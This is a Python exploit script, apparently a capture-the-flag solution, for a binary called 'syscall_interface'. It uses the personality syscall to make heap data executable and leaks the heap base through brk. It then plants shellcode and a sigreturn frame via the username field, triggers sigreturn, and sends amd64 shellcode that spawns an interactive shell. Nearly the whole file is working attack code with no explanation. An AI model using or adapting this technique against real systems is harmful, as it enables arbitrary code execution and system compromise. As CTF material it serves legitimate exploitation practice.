# File: exp.py
# Author: raycp
# Date: 2019-06-02
# Description: exp for syscall_interface

from pwn_debug import *


pdbg=pwn_debug("./syscall_interface")

pdbg.context.terminal=['tmux', 'splitw', '-h']
#context.log_level="debug"
#pdbg.local()
pdbg.debug("2.23")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")

membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

#io_file=IO_FILE_plus()
#io_file.show()
def syscall(syscall_number,arg):
    p.recvuntil("choice:")
    p.sendline("0")
    p.recvuntil("number:")
    p.sendline(str(syscall_number))
    p.recvuntil("argument:")
    p.sendline(str(arg))

def update_name(name):
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("username:")
    p.send(name)
def pwn():
    
    #pdbg.bp(0xec8)

    # step1 personnality syscall to make alloc data executable
    personality_syscall=135
    READ_IMPLIES_EXEC=0x0400000
    syscall(personality_syscall,READ_IMPLIES_EXEC)

    # step2 brk syscall to leak heap address
    brk_syscall=12
    arg=0
    syscall(brk_syscall,arg)
    p.recvuntil("RET(")
    heap_base=int(p.recvuntil(")")[:-1],16)-0x21000
    log.info("leak heap address: %s"%(hex(heap_base)))

    # step3 deploy sigreturn frame
    shellcode=asm("mov rdi,rax;")
    shellcode+=asm("mov rsi,rcx")
    shellcode+=asm("syscall")
    print len(shellcode)
    frame = SigreturnFrame()
    frame.rbp=0xffffffffffffffff
    frame.rbx=0xeeeeeeeeeeeeeeee
    frame.rdx=0x100
    frame.rax=0
    frame.rcx=heap_base+0x10
    frame.rsp=heap_base+0x10
    frame.rip=heap_base+0x38+8
    # set           ss=0x2b                                                     gs=0x33
    frame.csgsfs = (0x002b <<(16*3)) | (0x0000 <<(16*2)) | (0x0000 <<(16*1)) | (0x0033 <<(16*0))
    payload=shellcode+str(frame)[0x80:]
    update_name(payload[:0x7f])

    # step4 one more printf to flush shellcode to heap
    syscall(brk_syscall,arg)

    # step5 call sigreturn
    sigreturn_syscall=15
    arg=0
    syscall(sigreturn_syscall,arg)
    
    # step6 read shellcode
    raw_input("get shell>")
    payload="\x90"*0x38+asm("add rsp,0x100")+asm(shellcraft.amd64.sh())
    p.send(payload)
    p.interactive() #get the shell

if __name__ == '__main__':
   pwn()


